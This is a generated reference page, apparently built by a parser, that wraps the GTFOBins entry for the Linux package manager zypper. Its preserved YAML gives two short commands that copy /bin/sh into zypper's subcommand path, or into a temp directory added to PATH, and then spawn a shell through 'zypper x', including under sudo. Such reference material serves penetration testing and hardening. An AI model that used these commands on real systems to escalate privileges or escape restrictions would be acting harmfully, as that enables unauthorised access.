---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# zypper

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `zypper` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zypper` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [zypper](../../tools/linux/zypper.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | zypper |
| name | zypper |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/zypper/ |

## Preserved Source Material

```yaml
_body: ''
_name: zypper
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zypper
functions:
  shell:
  - code: 'cp /bin/sh /usr/lib/zypper/commands/zypper-x

      zypper x'
    comment: The copy usually requires elevated privileges.
    contexts:
      sudo: null
      unprivileged: null
  - code: 'cp /bin/sh /path/to/temp-dir/zypper-x

      PATH=$PATH:/path/to/temp-dir/ zypper x'
    contexts:
      sudo: null
      unprivileged: null
```
